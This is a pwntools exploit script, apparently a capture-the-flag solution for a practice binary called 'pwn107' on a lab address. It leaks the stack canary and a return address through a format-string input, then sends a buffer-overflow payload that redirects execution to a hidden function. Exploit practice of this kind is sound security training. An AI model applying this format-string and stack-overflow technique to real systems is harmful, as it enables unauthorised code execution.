#!/usr/bin/python3
from pwn import *
import string

context.binary = elf = ELF("./pwn107-1644307530397.pwn107", checksec = False)
#con = process()
#gdb.attach(con, gdbscript = "start")
con = remote("10.10.88.102", 9007)

con.recvuntil(b"last streak?")

input()
con.send(b"%19$lp.%13$lp.%13$lp")

con.recvuntil(b"Your current streak: ")

main0 = int(con.recvuntil(b".").decode("utf-8").strip("."), 16)
canary = int(con.recvuntil(b".").decode("utf-8").strip("."), 16)

log.info("main0: " + hex(main0))
get_streak = main0 - 0x46
log.info("canary: " + hex(canary))

payload = b"A"*0x18 + p64(canary) + b"B"*8 + p64(main0+242) + p64(get_streak)

input()
con.send(payload)

con.interactive()
